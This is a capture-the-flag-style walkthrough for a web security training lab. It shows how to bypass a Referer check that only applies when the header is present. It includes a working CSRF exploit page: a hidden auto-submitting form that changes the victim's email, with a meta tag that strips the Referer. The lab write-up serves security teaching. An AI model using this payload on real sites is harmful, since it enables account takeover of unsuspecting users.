Title: CSRF where Referer validation depends on header being present
Level: PRACTITIONER
Desc:  This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: wiener:peter 

# Walkthrough:
Changing domain in Referer results in request being blocked - 400 Bad Request
<img width="1129" height="510" alt="image" src="https://github.com/user-attachments/assets/b902def4-597d-4012-a4f9-abcf128d1ef4" />

However we can delete Referer header from request and now it will proceed.
<img width="1030" height="425" alt="image" src="https://github.com/user-attachments/assets/abf47304-c969-45ee-9dff-12944e1d19fd" />

Let's craft our exploit, which doesn't include Referer header.
```
<form method="POST" action="https://0ad100da036ba60f802f03f8002a0000.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="tes23@normal-user.net">
</form>
<meta name="referrer" content="never">
<script>
    document.forms[0].submit();
</script>
```

Additional field to never add referer header: `<meta name="referrer" content="never">`
